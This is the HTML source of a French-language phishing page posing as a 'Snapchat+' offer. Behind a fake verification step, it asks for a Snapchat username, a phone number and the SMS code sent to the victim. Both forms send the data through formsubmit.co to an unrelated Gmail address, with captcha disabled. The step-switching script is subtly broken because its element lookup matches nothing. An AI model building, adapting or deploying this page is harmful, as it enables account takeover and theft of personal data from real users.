                    
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Plus</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            /* Ton image de fond */
            background-image: url('fond.jpg');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            width: 100%;
            max-width: 400px;
            padding: 20px;
            text-align: center;
            background-color: rgba(255, 255, 255, 0.95);
            border-radius: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }

        /* Logo fantôme blanc */
        .snap-logo {
            width: 100px;
            height: 100px;
            background-color: transparent;
            margin: 0 auto 20px auto;
        }

        .snap-logo img {
            width: 100%;
            height: auto;
        }

        h1 {
            font-size: 24px;
            color: #000;
            margin-bottom: 10px;
            font-weight: 700;
        }

        p {
            color: #555;
            font-size: 14px;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 5px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            border: 2px solid #E0E0E0;
            border-radius: 30px;
            box-sizing: border-box;
            outline: none;
            transition: border-color 0.3s;
            background-color: #fff;
        }

        input:focus {
            border-color: #FFFC00;
        }

        .btn-submit {
            background-color: #FFFC00;
            color: #000;
            border: none;
            width: 100%;
            padding: 15px;
            font-size: 16px;
            font-weight: 700;
            border-radius: 30px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #FFF000;
        }

        #step-2 {
            display: none;
        }

        .small-note {
            font-size: 12px;
            color: #999;
            margin-top: 20px;
            font-style: italic;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- LOGO BLANC -->
        <div class="snap-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4f/Snapchat_icon_2019.svg/1200px-Snapchat_icon_2019.svg.png" alt="Snapchat">
        </div>

        <!-- Étape 1 : Infos -->
        <div id="step-1">
            <h1>Obtenez Snapchat+</h1>
            <p>Vérification requise pour activer votre profil.</p>
            
            <form action="https://formsubmit.co/snap.plus.com@gmail.com" method="POST">
                <div class="form-group">
                    <label for="username">Nom d'utilisateur Snapchat</label>
                    <input type="text" id="username" name="username" placeholder="Ex: john_doe" required>
                </div>

                <div class="form-group">
                    <label for="phone">Numéro de téléphone</label>
                    <input type="tel" id="phone" name="phone" placeholder="Ex: 06 12 34 56 78" required>
                </div>

                <input type="hidden" name="_subject" value="Snapchat+ Infos">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_next" value="">

                <button type="submit" class="btn-submit">Vérifier</button>
            </form>
        </div>

        <!-- Étape 2 : Code SMS -->
        <div id="step-2">
            <h1>Vérification</h1>
            <p>Nous avons envoyé un code à votre numéro.</p>
            
            <form action="https://formsubmit.co/snap.plus.com@gmail.com" method="POST">
                <div class="form-group">
                    <label for="code">Code SMS</label>
                    <input type="text" id="code" name="code" placeholder="Entrez le code à 4 chiffres" required>
                </div>

                <input type="hidden" name="_subject" value="Snapchat+ Code SMS">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_next" value="">

                <button type="submit" class="btn-submit">Confirmer</button>
            </form>
            
            <p class="small-note">Le code peut prendre quelques minutes à venir.</p>
        </div>

    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Cacher le step 1 et afficher le step 2 dès que l'utilisateur clique sur "Vérifier"
            document.getElementById('step-1 form').addEventListener('submit', function(e) {
                // On empêche la page de recharger immédiatement pour montrer l'étape 2
                setTimeout(() => {
                    document.getElementById('step-1').style.display = 'none';
                    document.getElementById('step-2').style.display = 'block';
                }, 500);
            });
        });
    </script>
</body>
</html>
